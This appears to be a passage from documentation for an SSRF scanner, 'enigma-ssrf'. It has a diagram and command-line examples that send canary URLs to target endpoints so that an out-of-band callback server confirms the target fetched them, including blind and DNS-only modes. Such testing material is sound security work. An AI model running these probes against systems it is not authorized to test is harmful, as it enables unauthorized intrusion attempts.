...
The primary confirmation method. The engine generates unique canary tokens and embeds them in payload URLs pointing to a controlled callback server (`poc-mastermind.com`). When the target server fetches the URL, the callback server records the connection:

```mermaid
flowchart LR
    ATTACKER["Enigma Scanner"] -->|"1. Send payload:<br/>url=https://poc-mastermind.com/c/TOKEN123"| TARGET["Target Server"]
    TARGET -->|"2. Server fetches URL"| CALLBACK["poc-mastermind.com<br/>OOB Callback Server"]
...
enigma-ssrf run "https://target.com/api/fetch" "url" \
  --canary="https://poc-mastermind.com/c/TOKEN"
...
enigma-ssrf run "https://target.com/api/webhook" "callback_url" \
  --test-headers --canary="https://poc-mastermind.com/c/TOKEN"
...
enigma-ssrf blind "https://target.com/webhook" "callback_url" \
  --canary="https://poc-mastermind.com/c/TOKEN" --watch --timeout=60000

# DNS-only mode for egress-filtered environments
enigma-ssrf blind "https://target.com/api/notify" "url" \
  --dns-only --canary="https://poc-mastermind.com/c/TOKEN"
```
